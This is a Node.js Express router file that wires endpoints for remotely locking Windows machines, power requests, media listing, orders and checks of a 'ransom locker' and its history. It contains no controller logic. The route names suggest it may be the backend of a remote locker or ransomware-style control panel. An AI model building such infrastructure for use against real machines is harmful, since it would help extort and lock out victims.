const express = require('express');
const info = require("../Controllers/infoController")
const Order = require("../Controllers/controlController")

const router = express.Router();
router
    .route('/status-app-update')
    .post(info.status_update)
router
    .route('/list-media-of-requests')
    .get(info.get_requests_media)
router
    .route('/last-power-request')
    .get(info.get_last_power_request)
router
    .route('/last-lock-request')
    .get(info.get_last_windows_lock)
router
    .route('/check-ransom-locker')
    .get(info.check_ransom_locker)
router
    .route('/get-ransom-locker-history')
    .get(info.get_ransom_history)
router
    .route("/check")
    .post(Order.checkOrderStatus)
router
    .route("/new")
    .post(Order.createOrder)
router
    .route("/done")
    .post(Order.updateOrder)
router
    .route("/lock-the-sky")
    .post(Order.lock_the_sky)

router
    .route('/check-lock-status')
    .post(Order.check_if_locked)

module.exports = router;